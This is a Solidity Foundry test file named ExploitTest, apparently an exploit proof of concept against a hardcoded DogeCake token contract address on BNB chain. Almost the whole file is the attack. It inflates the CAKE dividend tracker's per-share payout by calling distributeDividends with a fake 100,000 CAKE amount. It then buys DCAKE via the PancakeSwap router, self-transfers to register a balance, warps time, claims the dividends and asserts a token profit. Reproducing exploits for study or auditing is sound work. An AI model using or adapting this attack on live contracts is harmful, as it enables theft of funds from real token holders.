// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Minimal interfaces needed
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface CakeDividendTracker {
    function distributeDividends(uint256 amount) external;
    function processAccount(address payable account, bool automatic) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface DogeDividendTracker {
    function distributeDividends(uint256 amount) external;
    function processAccount(address payable account, bool automatic) external returns (bool);
}

interface DogeCake {
    function cakeDividendTracker() external view returns (address);
    function dogeDividendTracker() external view returns (address);
    function cakeDividendToken() external view returns (address);
    function dogeDividendToken() external view returns (address);
    function owner() external view returns (address);
    function setTradingIsEnabled(bool _enabled) external;
    function claim() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x88b9BBdaF00770Ba398c9A2e0d3C02D45Dcb9820;
    address attacker = address(this);

    // Store addresses from setUp for use in testExploit
    address public cakeDividendTrackerAddr;
    address public dogeDividendTrackerAddr;
    address public cakeToken;
    address public dogeToken;
    DogeCake public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the dividend tracker addresses from the main contract
        target = DogeCake(TARGET);
        cakeDividendTrackerAddr = address(target.cakeDividendTracker());
        dogeDividendTrackerAddr = address(target.dogeDividendTracker());

        // Get dividend token addresses
        cakeToken = target.cakeDividendToken();
        dogeToken = target.dogeDividendToken();

        // Label addresses for debugging
        vm.label(cakeDividendTrackerAddr, "CakeDividendTracker");
        vm.label(dogeDividendTrackerAddr, "DogeDividendTracker");
        vm.label(cakeToken, "CAKE");
        vm.label(dogeToken, "DOGE");

        // Give attacker CAKE tokens
        uint256 initialCakeBalance = 1000 * 10**18;
        deal(cakeToken, attacker, initialCakeBalance);

        // Also give some DCAKE tokens to become dividend holder
        // We need to get DCAKE tokens to be eligible for dividends
        // First, enable trading if not already enabled
        vm.prank(target.owner());
        target.setTradingIsEnabled(true);

        // Get some DCAKE tokens by buying from Uniswap
        // Need BNB to buy DCAKE
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82).balanceOf(address(this));
        // We'll exploit the CakeDividendTracker since oracle checks CAKE balance

        // 1. Get interface to CakeDividendTracker
        CakeDividendTracker cakeTracker = CakeDividendTracker(cakeDividendTrackerAddr);

        // 2. Transfer small amount of CAKE to the tracker contract
        uint256 smallAmount = 1 * 10**18; // 1 CAKE
        IERC20(cakeToken).transfer(cakeDividendTrackerAddr, smallAmount);

        // 3. Call distributeDividends with a large amount to inflate magnifiedDividendPerShare
        uint256 fakeAmount = 100000 * 10**18; // 100,000 CAKE (fake)
        cakeTracker.distributeDividends(fakeAmount);

        // 4. We need to be a token holder in the dividend tracker to claim dividends
        // The dividend tracker tracks DCAKE token holders with minimum balance
        // We need to get DCAKE tokens and have the tracker update our balance

        // First, let's get some DCAKE tokens by buying from Uniswap
        // We'll need to interact with PancakeSwap router
        IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Approve router to spend BNB
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Swap 1 BNB for DCAKE
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp + 300
        );

        // 5. Now we have DCAKE tokens, but the dividend tracker needs to know our balance
        // The main contract should call setBalance on the tracker during transfers
        // Let's transfer some DCAKE to ourselves to trigger setBalance
        uint256 dCakeBalance = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).transfer(attacker, dCakeBalance / 2); // Self-transfer to trigger setBalance

        // 6. Wait for claim wait period (if needed)
        // The claimWait is 3600 seconds (1 hour), but we can warp time
        vm.warp(block.timestamp + 4000);

        // 7. Claim dividends
        // Record initial CAKE balance
        uint256 initialAttackerCake = IERC20(cakeToken).balanceOf(attacker);

        // Call claim on main contract
        target.claim();

        // Check if we received CAKE
        uint256 finalAttackerCake = IERC20(cakeToken).balanceOf(attacker);
        require(finalAttackerCake > initialAttackerCake, "No dividends claimed");
        uint256 finalBalance = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

